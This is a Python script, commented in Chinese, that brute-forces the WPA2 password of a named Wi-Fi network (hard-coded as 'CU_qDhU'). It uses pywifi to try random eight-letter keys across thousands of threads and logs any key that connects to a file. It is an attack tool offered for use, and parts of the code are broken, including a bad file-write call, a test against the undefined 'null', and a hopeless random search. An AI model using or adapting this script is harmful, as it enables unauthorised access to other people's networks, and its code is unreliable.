import time
import pywifi
from pywifi import const
import string
import random

## u23wx9ni

def random_sentence(size):
    # 生成8位随机字符串，小写字母和数字组成
    # char_lists = string.ascii_lowercase + string.digits
    # return ''.join(random.choice(char_lists) for _ in range(size))
    
    # 生成8位随机字符串，大小写字母组成
    char_lists = string.ascii_lowercase + string.ascii_uppercase
    return ''.join(random.choice(char_lists) for _ in range(size))
    
    
    # 生成8位随机数， 小写字母组成
    # char_lists = string.ascii_lowercase
    # return ''.join(random.choice(char_lists) for _ in range(size))
    
    # 生成8位随机数， 数字组成
    # char_lists = string.digits
    # return ''.join(random.choice(char_lists) for _ in range(size))
    
def test_connect(findStr, ssidname):
    profile = pywifi.Profile()
    profile.ssid = ssidname
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = findStr


    # 删除所有的链接

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    
    iface.connect(tmp_profile)
    time.sleep(3)
    
    # 判断是否链接成功
    if iface.status() == const.IFACE_CONNECTED:
        isOk = True
    else:
        isOk = False
        print('密码错误：{}'.format(findStr))
    iface.disconnect()
    time.sleep(2)
    return isOk
    
import threading


def inifunc():    
    ssidname = 'CU_qDhU'
    
    myStr = random_sentence(8)
    if test_connect(myStr, ssidname):
        with open('password.txt', 'a') as fp:
            fp.write(str(myStr), '-->', ssidname)

import sys    
if __name__ == '__main__':
    while True:
    
        for i in range(10000):
            threading.Thread(target=inifunc).start()
        
        time.sleep(10)
        with open('password.txt', 'r') as fr:
            if fr.read() is not null:
                sys.exit()
    